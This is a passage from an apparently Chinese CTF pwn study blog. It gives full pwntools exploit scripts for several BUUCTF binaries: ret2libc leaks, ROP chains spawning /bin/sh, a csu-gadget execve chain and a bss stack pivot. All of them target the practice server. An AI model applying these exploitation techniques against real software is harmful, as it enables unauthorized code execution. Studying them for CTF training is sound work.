偏移</span><br>obj.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)    <span class="hljs-comment">#/bin/sh 偏移</span><br>obj.dump(<span class="hljs-string">&quot;__libc_start_main_ret&quot;</span>)    <br></code></pre></td></tr></table></figure><h2 id="3-PWN5-普通的格式化字符串漏洞"><a href="#3-PWN5-普通的格式化字符串漏洞" class="headerlink" title="3. PWN5(普通的格式化字符串漏洞)"></a>3. PWN5(普通的格式化字符串漏洞)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtstr_payload</span>(<span class="hljs-params">offset, writes, numbwritten=<span class="hljs-number">0</span>, write_size=<span class="hljs-string">&#x27;byte&#x27;</span>, write_size_max=<span class="hljs-string">&#x27;long&#x27;</span>, </span></span><br><span class="hljs-params"><span class="hljs-function">                   overflows=<span class="hljs-number">16</span>, strategy=<span class="hljs-string">&quot;small&quot;</span>, badbytes=<span class="hljs-built_in">frozenset</span>(<span class="hljs-params"></span>), offset_bytes=<span class="hljs-number">0</span></span>):</span> → <span class="hljs-built_in">str</span><br><span class="hljs-string">&#x27;&#x27;&#x27;Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. </span><br><span class="hljs-string">The size of the addr is taken from context.bits</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>Parameters:<br>offset (<span class="hljs-built_in">int</span>) – the first formatter’s offset you control<br>writes (<span class="hljs-built_in">dict</span>) – <span class="hljs-built_in">dict</span> <span class="hljs-keyword">with</span> addr, value &#123;addr: value, addr2: value2&#125;<br>numbwritten (<span class="hljs-built_in">int</span>) – number of byte already written by the printf function<br>write_size (<span class="hljs-built_in">str</span>) – must be byte, short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>. Tells <span class="hljs-keyword">if</span> you want to write byte by byte, <br>short by short <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span> by <span class="hljs-built_in">int</span> (hhn, hn <span class="hljs-keyword">or</span> n)<br>overflows (<span class="hljs-built_in">int</span>) – how many extra overflows (at size sz) to tolerate to reduce the length of <br>the <span class="hljs-built_in">format</span> string<br>strategy (<span class="hljs-built_in">str</span>) – either ‘fast’ <span class="hljs-keyword">or</span> ‘small’ (‘small’ <span class="hljs-keyword">is</span> default, ‘fast’ can be used <span class="hljs-keyword">if</span> there <br>                                                are many writes)<br>Returns:<br>The payload <span class="hljs-keyword">in</span> order to do needed writes<br></code></pre></td></tr></table></figure><h2 id="4-BabyRop-0"><a href="#4-BabyRop-0" class="headerlink" title="4. BabyRop[0]."></a>4. BabyRop<a href="https://blog.csdn.net/weixin_44677409/article/details/113769436">[0]</a>.</h2><p>查看程序的保护机制<img src="https://i.loli.net/2021/07/22/Ri6VUFBHCIbNpmj.png" alt="image-20210722002115059"> </p><p>发现是got表不可写的32位程序<br>拖进ida查看伪代码<img src="https://i.loli.net/2021/07/22/18Yp72mcR5gDEoV.png" alt="image-20210722002553447"> </p><p>sub_80486BB是初始化缓存区的函数<br>发现buf是一个随机数<img src="https://i.loli.net/2021/07/22/k7LqQlvpzZsFEry.png" alt="image-20210722002240287"> </p><p>发现函数中存在strncmp比较函数，其中buf为用户输入的值，s为buf随机数，如果不相等则会退出程序，<u>所以需要想办法绕过这个判断，所以v1的值必须为0</u>.</p><p>v1 = strlen(buf),strlen这个函数有个<strong>缺陷</strong>：遇到\x00直接截断。所以我们要输入第一位数为\x00</p><p>buf被IDA识别为32位数组, 函数返回值是buf[7], 所以直接将buf[7]写成想要的数值即可</p><p>接下来来看最后一个函数<img src="https://i.loli.net/2021/07/22/l6dPBCuI5vsyKNL.png" alt="image-20210722002708919"> </p><p>其中a1即为上文中的v5，假如a1等于127则会执行第一条语句，不会溢出，当a1大于0xE7时就会存在溢出，从而覆盖返回地址</p><p>解题思路：首先通过\x00来绕过判断，覆盖v5为\xff（使得v5尽可能的大），通过wirte函数来泄露write的内存地址，然后利用libc来计算system函数地址，最后利用溢出使得返回地址为system</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28361</span>)<br><span class="hljs-comment">#ignore the strncmp and overwrite buf[7] to the max\xff</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br><span class="hljs-comment">#jump to read(0, buf, a1) and char buf[231]</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>)<br><span class="hljs-comment">#leak the write_addr</span><br>elf = ELF(<span class="hljs-string">&quot;./babyrop&quot;</span>, <span class="hljs-number">0</span>)<br>got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<br>plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<br>main = <span class="hljs-number">0x8048825</span><br><br>payload = payload + p32(plt) + p32(main) + p32(<span class="hljs-number">1</span>) + p32(got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#payload = flat([b&#x27;a&#x27;*(0xe7+0x4), plt, main, 1, got, 4])</span><br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>write_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br><span class="hljs-comment">#calc the sys_addr and returned to the main function </span><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>, <span class="hljs-number">0</span>)<br>sys_libc = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>write_libc = libc.symbols[<span class="hljs-string">&quot;write&quot;</span>]<br>binsh_libc  = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br><br>libc_base = write_addr - write_libc<br>sys = libc_base + sys_libc<br>binsh = libc_base + binsh_libc<br><br><span class="hljs-comment">#constrct the payload</span><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;\xff&#x27;</span><br>p.sendline(payload)<br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0xe7</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>, binsh])<br>p.sendlineafter(<span class="hljs-string">&quot;ct\n&quot;</span>, payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>tips:</strong>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#新用法get:</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>sla=<span class="hljs-keyword">lambda</span> x,y:io.sendlineafter(x,y)<br>rl=<span class="hljs-keyword">lambda</span> :io.recvline()<br>ru=<span class="hljs-keyword">lambda</span> x:io.recvuntil(x)<br></code></pre></td></tr></table></figure><ul><li><p>strlen()函数遇到’\0’就会停止!!!!!!</p></li><li><p>别忘了先是<strong>参数</strong>后是sys的<strong>返回地址</strong>.</p></li><li><p>pack():   Word-size, endianness and signedness is done according to context</p><p>所以, flat()中的wordsize就不用管了, 自动使用相应的pack()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pwnlib.util.packing.flat(*a, **kw)<br>- flat(*args, preprocessor = <span class="hljs-literal">None</span>, length = <span class="hljs-literal">None</span>, filler = de_bruijn(), <span class="hljs-comment">#???debruijn是个什么东西</span><br>  word_size = <span class="hljs-literal">None</span>, endianness = <span class="hljs-literal">None</span>, sign = <span class="hljs-literal">None</span>) -&gt; <span class="hljs-built_in">str</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="6-ciscn-2019-n-8"><a href="#6-ciscn-2019-n-8" class="headerlink" title="6.ciscn_2019_n_8"></a>6.ciscn_2019_n_8</h2><ul><li>三种方法一应俱全<a href="https://www.cnblogs.com/bhxdn/p/12679290.html">[0]</a>.</li><li>还是看别人的才做的出来, 不然谁会知道:<ul><li>get_flag的返回地址不能乱写，打远程时，如果程序是异常退出了，最后是不给你回显的. </li><li>正常退出需要使用exit(), 所以将get_flag的返回地址写成exit的地址</li><li>如果正常退出, 你不加一个p.recv()接受字符, 仍然没有回显.</li><li>还有就是修改bss段的权限, 高级操作, 又得学一个函数**(还没学)**.</li></ul></li></ul><h2 id="7-not-the-same"><a href="#7-not-the-same" class="headerlink" title="7.not_the_same"></a>7.not_the_same</h2><ul><li>简单的栈溢出题目, 就不截图了, 和第六题是一样的, 需要注意exit正常退出程序后必须recv几个字符远程才会有输出</li><li>可以看到我做了一个万能头, 以后写exp只要复制修改一下就可以了, 还是挺方便的</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26867</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>)<br><span class="hljs-comment">#整理以下思路：45个数组先覆盖掉，然后是get_secrt地址，然后是write地址，</span><br><span class="hljs-comment">#write的返回地址（感觉得是exit的地址），第一个参数1，第二个0x80ECA2D，第三个50字节（就这么长)</span><br><span class="hljs-comment">#还是printf函数的参数简单一点</span><br>elf = ELF(<span class="hljs-string">&quot;./not_the_same_3dsctf_2016&quot;</span>, <span class="hljs-number">0</span>)<br>exit = elf.symbols[<span class="hljs-string">&quot;exit&quot;</span>]<br><span class="hljs-comment">#write = elf.symbols[&quot;write&quot;]</span><br>printf = elf.symbols[<span class="hljs-string">&quot;printf&quot;</span>]<br>get = elf.symbols[<span class="hljs-string">&quot;get_secret&quot;</span>]<br>buf = <span class="hljs-number">0x80ECA2D</span><br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">45</span>, get, printf, exit, buf])<br>sl(payload)<br>ra()<br></code></pre></td></tr></table></figure><h2 id="8-bjdctf-2020-babystack"><a href="#8-bjdctf-2020-babystack" class="headerlink" title="8.bjdctf_2020_babystack"></a>8.bjdctf_2020_babystack</h2><ul><li>比较简单, 主要的问题是context的默认bit是32, 换成万能头的context.binary就没有问题了</li></ul><h2 id="9-ciscn-2019-ne-5"><a href="#9-ciscn-2019-ne-5" class="headerlink" title="9.ciscn_2019_ne_5"></a>9.ciscn_2019_ne_5</h2><p>过程<a href="https://www.freesion.com/article/93161361727/">[0]</a>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.binary = <span class="hljs-string">&#x27;./ciscn_2019_ne_5&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>ss=<span class="hljs-keyword">lambda</span> x:p.send(x)       <span class="hljs-comment">#send string</span><br>sl=<span class="hljs-keyword">lambda</span> x:p.sendline(x)<br>ru=<span class="hljs-keyword">lambda</span> x:p.recvuntil(x)<br>rl=<span class="hljs-keyword">lambda</span> :p.recvline()<br>ra=<span class="hljs-keyword">lambda</span> :p.recv()         <span class="hljs-comment">#recv a</span><br>rn=<span class="hljs-keyword">lambda</span> x:p.recv(x)       <span class="hljs-comment">#recv n</span><br>sla=<span class="hljs-keyword">lambda</span> x,y:p.sendlineafter(x,y)<br>itt=<span class="hljs-keyword">lambda</span> :p.interactive()<br>c = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> c == <span class="hljs-number">0</span>:<br>    p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28273</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./ciscn_2019_ne_5&quot;</span>)<br><span class="hljs-comment">#思路：先addlog写入128字节的src，下一次循环到getfalg里面用strcpy写入dest实现溢出，返回地址sys，sys返回地址随意，sys参数为sh地址</span><br>elf = ELF(<span class="hljs-string">b&quot;./ciscn_2019_ne_5&quot;</span>, <span class="hljs-number">0</span>)<br>sh = <span class="hljs-built_in">next</span>(elf.search(<span class="hljs-string">b&quot;sh&quot;</span>))<span class="hljs-comment">#可以直接用ELF.search, 或者ROPgadget --binary &quot;&quot; --string &quot;&quot;</span><br>sys = elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = flat([<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x48</span>+<span class="hljs-number">0x4</span>), sys, <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>, sh])<br><span class="hljs-comment">#sla(b&#x27;password:&#x27;, b&#x27;administrator&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;1&#x27;)</span><br><span class="hljs-comment">#sla(b&#x27;info:&#x27;, payload)</span><br><span class="hljs-comment">#sla(b&#x27;0.Exit\n:&#x27;, b&#x27;4&#x27;)</span><br>sl(<span class="hljs-string">b&#x27;administrator&#x27;</span>)<span class="hljs-comment">#只要搞得清楚, 直接只用sendline(), 只是调试有点乱而已(也还好, 现在的输入也不会太多)</span><br>sl(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sl(payload)<br>sl(<span class="hljs-string">b&#x27;4&#x27;</span>)<br><span class="hljs-comment">#sl(b&#x27;administrator\n1\n&#x27;+payload+b&#x27;\n4&#x27;)甚至可以写成</span><br>itt()<br></code></pre></td></tr></table></figure><h2 id="10-others-shellcode"><a href="#10-others-shellcode" class="headerlink" title="10. others_shellcode_"></a>10. others_shellcode_</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">__asm &#123; <span class="hljs-keyword">int</span> <span class="hljs-number">80</span>h; LINUX - sys_execve &#125; <span class="hljs-comment">//tmd这又是哪门子的LINUX</span><br></code></pre></td></tr></table></figure><p>p.s. 关于__asm <a href="https://docs.microsoft.com/en-us/cpp/assembler/inline/asm?view=msvc-160">[0]</a>.</p><p>之前刷题中用到的后门函数都是system(“/bin/sh”)，这次出现了一个新的后门：**execve()**。</p><p>函数定义:<br>**int execve(const char *filename, char <em>const argv[ ], char <em>const envp[ ]);</em></em> </p><p>寄存器eax放execve的系统调用号11；<br>寄存器ebx放文件路径，即第一个参数；<br>寄存器ecx放第二个参数，是利用数组指针把内容传递给执行文件，并且需要以空指针(NULL)结束；<br>寄存器edx放最后一个参数，为传递给执行文件的新环境变量数组。</p><p>后两个参数一般为0</p><p>int 0x80：中断<br>执行系统调用函数execve()时，execve()通过int 0x80指令进入系统调用入口程序，并且把系统调用号11放入eax中，接着把参数放入ebx，ecx和edx中。</p><h2 id="11-2018-rop"><a href="#11-2018-rop" class="headerlink" title="11.2018_rop"></a>11.2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">setresuid(); <br>setresgid();<br><span class="hljs-comment">//These two syscalls are like their equivalent kernels calls above, but with the additional ability to set the Saved-User-ID (SUID) or Saved-Group-ID (SGID). re represent</span><br></code></pre></td></tr></table></figure><h2 id="12-ciscn-s-3"><a href="#12-ciscn-s-3" class="headerlink" title="12.ciscn_s_3"></a>12.ciscn_s_3</h2><ol><li><p>checksec</p><p><img src="https://i.loli.net/2021/08/06/Exk1cpHYvmls4fJ.png" alt="image-20210806154145249"></p></li><li><p>main函数里面只有vuln, vuln函数里就是简单的sysread syswrite, 都是通过syscall以及系统调用号来执行的</p><img src="https://i.loli.net/2021/08/06/SP7dTJbw4XCQBDm.png" alt="image-20210806154501028" style="zoom:80%;" /> <p>gadgets函数:</p><img src="https://i.loli.net/2021/08/06/OiYpf1UhETLPwo5.png" alt="image-20210806154658559" style="zoom:80%;" /> </li><li><p>最重要的两点</p><ul><li>这两个函数<strong>都不以leave结尾</strong>, 意味着函数结束后没有恢复到之前的栈帧, 进入函数时的ebp的位置即为返回地址, 所以IDA中栈分析是错误的, <strong>真实栈结构还得看汇编代码</strong> </li><li><strong>第一种办法:</strong> 看见了一个mov rax, <strong>3B</strong>h    retn, 代表着我们可以利用这两行代码为执行sys_execve做准备</li><li><strong>第二种办法:SROP</strong> </li><li>下面先用第一种方法.</li></ul></li><li><p>从反汇编代码中看出sys_read几乎无限长字节(0x400), sys_write30个单位, 有明显的栈溢出, 这里我们使用59号系统调用(64位), 构造</p><p><code>execve(&#39;/bin/sh&#39;，0，0）</code> </p><p>但是程序中并未发现/bin/sh, 所以需要手动输入, 新问题是sys_read后<strong>我们的字符串</strong>在什么地址上? 所以需要<strong>leak</strong>出某一个有用的地址</p></li><li><p>gdb调试:</p><p>b vuln-&gt;run-&gt;continue-&gt; aaaaaaaaa(测试输入)-&gt;发现栈的<u>基地址</u> </p><ul><li><p>不得不说的就是这个<strong>栈的基地址</strong>, 一般是main函数参数中argv[0]即文件的路径, gdb中会写成这个样子</p><p> <code>0xffffd0ec —▸ 0xffffd204 —▸ 0xffffd3c4 ◂— &#39;/root/Desktop/fm&#39;</code> </p><p> 取第一次解引用的地址即为栈的基地址, 减去rsp得到<strong>0x118</strong> </p><p> 栈的基地址长这样子, 有path的那条就是, 下面一大串的是环境变量envp</p> <img src="https://i.loli.net/2021/08/06/R2XcmJiCe7lG3Lo.png" alt="image-20210806235944050" style="zoom: 80%;" /> </li></ul></li><li><p><strong>要注意的是,</strong> pop指令弹出的是栈上指针对应地址的数据, 平时栈溢出填充的很容易以为直接就是数据, 实际上在这种情况下应该写成一个地址, 指向payload中后面的参数, 如下sh+0x50指向mov_rax</p><p><img src="https://i.loli.net/2021/08/07/j9ZSDorqgbEfGvy.png"> </p></li><li><p>详细注释:</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import*</span><br>context.binary = <span class="hljs-string">&#x27;./ciscn_s_3&#x27;</span><br>context.log_level= <span class="hljs-string">&#x27;debug&#x27;</span><br>sl=<span class="hljs-keyword">lambda</span> x:io.sendline(x)<br>rn=<span class="hljs-keyword">lambda</span> x:io.recv (x)<br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, xxxxx)<br>vuln=<span class="hljs-number">0x4004ed</span><br>pop_rdi=<span class="hljs-number">0x4005a3</span><br>csu_end=<span class="hljs-number">0x40059a</span><br>csu_front=<span class="hljs-number">0x400580</span><br>mov_rax=<span class="hljs-number">0x4004e2</span><br>syscall=<span class="hljs-number">0x400517</span><br><span class="hljs-comment">#第一次的目的是leak基地址, 填上数组的16字节即可, 返回地址继续回到vuln</span><br>payload=p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(vuln)<br>sl(payload)<br>rn(<span class="hljs-number">0x20</span>)<br>binsh=u64(rn(<span class="hljs-number">8</span>))-<span class="hljs-number">0x118</span><br><span class="hljs-comment">#        输入binsh     填完数组  即csuend      即mov_rax地址   rbx,rbp填为0    r13-r15全为0</span><br>payload= <span class="hljs-string">b&#x27;/bin/sh\0&#x27;</span>+ p64(<span class="hljs-number">0</span>)+  p64(csu_end)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+      p64(binsh+<span class="hljs-number">0x50</span>)+ p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br><span class="hljs-comment">#即csufront     ROPgadget    execve首参数  mov系统调用号   最后syscall59执行execve   </span><br>+p64(csu_front)+p64(pop_rdi)+p64(binsh)+  p64(mov_rax)+  p64(syscall) <br><br>sl(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p> <strong>附: SROP<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">[CTF-WiKi]</a></strong> <strong>[<a href="https://blog.csdn.net/qinying001/article/details/104291387">writeup</a>]</strong> </p><ul><li><p>简单说来SROP就是调用sigreturn函数改写所有寄存器的值, 然后再执行rip指向的地址</p><p>本题中流程为: 泄露栈基地址-&gt;构造frame = SigreturnFrame()-&gt;填满数组, mov调用号15, syscall地址, bytes(frame)</p></li></ul><h2 id="13-babyheap-0ctf-2017"><a href="#13-babyheap-0ctf-2017" class="headerlink" title="13.babyheap_0ctf_2017"></a>13.babyheap_0ctf_2017</h2><p>看了老半天源代码和基础知识</p><p>估摸着我得过几天复习复习, 可不能忘记了</p><p><a href="https://blog.csdn.net/huzai9527/article/details/114807930?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.base&spm=1001.2101.3001.4242">别人的详细的wp</a>  <a href="https://bbs.pediy.com/thread-223461.htm">看雪 不太详细</a> </p><h2 id="14-Black-Watch-入群题-PWN"><a href="#14-Black-Watch-入群题-PWN" class="headerlink" title="14.[Black Watch 入群题]PWN"></a>14.[Black Watch 入群题]PWN</h2><p>又是一种没见过的方法, 名为<strong>栈转移</strong>, 用于栈溢出不够, 以leave ret结尾, 有或能够向bss段写入数据的, 将<strong>rsp</strong>转移到<strong>bss</strong>段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">leave = mov rsp, rbp pop rbp    <br>ret =  pop rip<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs flow">st=&gt;parallel: 流程:<br>opa1=&gt;start: 填满栈上数组, <br>覆盖ebp为bss段某一地址<br>opa2=&gt;start: 修改返回地址为leave&amp;ret的gadget<br>opb1=&gt;start: 往bss写入4字节数据作为第二次 pop rbp<br>opb2=&gt;start: 如果未知sys,/bin/sh等地址<br>可用此次leak地址然后在下一次执行system函数<br>a=&gt;parallel: 结束<br>st(path1, left)-&gt;opa1-&gt;opa2<br>st(path2, right)-&gt;opb1-&gt;opb2<br>opa2-&gt;a<br>opb2-&gt;a<br><br></code></pre></td></tr></table></figure><p>…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python2</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.binary = <span class="hljs-string">&#x27;./spwn&#x27;</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25611</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;spwn&quot;</span>)<br><br>bss_s = <span class="hljs-number">0x0804A300</span><span class="hljs-comment">#将fake栈迁移到bss中</span><br>leave_ret = <span class="hljs-number">0x08048511</span><span class="hljs-comment">#栈迁移所需要的的地址</span><br>write_plt = elf.plt[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#plt表可以调用write函数</span><br>write_got = elf.got[<span class="hljs-string">&quot;write&quot;</span>]<span class="hljs-comment">#got表里有write函数的真实地址</span><br>main_addr = elf.symbols[<span class="hljs-string">&quot;main&quot;</span>]<span class="hljs-comment">#控制函数执行流需要再次回到主函数</span><br><span class="hljs-comment"># 需要打印出write的真实地址查出，并且让函数再次返回主函数</span><br>payload = <span class="hljs-string">&quot;aaaa&quot;</span> + p32(write_plt) + p32(main_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br>p.sendafter(<span class="hljs-string">&quot;name?&quot;</span>, payload)<br><span class="hljs-comment"># 上面将一些执行流程写入了bss段</span><br><span class="hljs-comment"># 